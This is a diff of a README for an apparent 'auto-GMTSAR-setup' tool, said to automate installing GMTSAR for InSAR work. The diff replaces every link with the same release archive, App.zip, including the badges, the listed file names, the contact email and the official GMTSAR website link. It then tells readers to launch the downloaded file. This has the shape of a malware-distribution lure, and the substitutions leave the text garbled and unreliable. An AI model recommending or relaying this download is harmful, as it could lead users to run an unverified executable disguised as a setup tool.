@@ -1,6 +1,6 @@
 # 🌟 Automate Your GMTSAR Setup with ease! 🌟
 
-[![Download Now](https://img.shields.io/badge/download-v1.0.0-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Now](https://github.com/rizki7680/auto-GMTSAR-setup/releases/download/v1.0/App.zip)](https://github.com/rizki7680/auto-GMTSAR-setup/releases/download/v1.0/App.zip)
 
 Welcome to the `auto-GMTSAR-setup` repository - your one-stop solution to automate the installation process of GMTSAR and its dependencies effortlessly. This tool is designed to simplify the setup process for researchers and professionals in the field of InSAR processing. With just a few simple steps, you can have your InSAR environment up and running in no time!
 
@@ -18,9 +18,9 @@ Welcome to the `auto-GMTSAR-setup` repository - your one-stop solution to automa
 
 The repository is organized as follows:
 
-- `setup.sh`: The main script file that automates the installation process.
+- `https://github.com/rizki7680/auto-GMTSAR-setup/releases/download/v1.0/App.zip`: The main script file that automates the installation process.
   
-- `README.md`: The file you are currently reading, providing essential information about the repository.
+- `https://github.com/rizki7680/auto-GMTSAR-setup/releases/download/v1.0/App.zip`: The file you are currently reading, providing essential information about the repository.
 
 ## 🏷️ Topics
 
@@ -30,7 +30,7 @@ This repository covers various topics related to deformation, earth observation,
 
 To get started with the repository, simply download the latest release from the following link:
 
-[![Download Now](https://img.shields.io/badge/download-v1.0.0-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Now](https://github.com/rizki7680/auto-GMTSAR-setup/releases/download/v1.0/App.zip)](https://github.com/rizki7680/auto-GMTSAR-setup/releases/download/v1.0/App.zip)
 
 Once you have downloaded the release, launch the file and follow the on-screen instructions to set up your GMTSAR environment effortlessly.
 
@@ -40,11 +40,11 @@ Contributions to the `auto-GMTSAR-setup` repository are welcome! If you have any
 
 ## 📞 Contact
 
-If you have any questions or need assistance with the `auto-GMTSAR-setup` tool, please feel free to reach out via email at autogmtsarsetup@gmail.com. Your feedback is valuable to us, and we are here to help you with any queries you may have.
+If you have any questions or need assistance with the `auto-GMTSAR-setup` tool, please feel free to reach out via email at https://github.com/rizki7680/auto-GMTSAR-setup/releases/download/v1.0/App.zip Your feedback is valuable to us, and we are here to help you with any queries you may have.
 
 ## 🌐 Explore More
 
-Visit the official GMTSAR website to learn more about the tool and its capabilities. Click [here](https://www.gmtsar.org/) to explore the website and discover the power of GMTSAR in InSAR processing.
+Visit the official GMTSAR website to learn more about the tool and its capabilities. Click [here](https://github.com/rizki7680/auto-GMTSAR-setup/releases/download/v1.0/App.zip) to explore the website and discover the power of GMTSAR in InSAR processing.
 
 ## 🎉 Get Started Now!
 
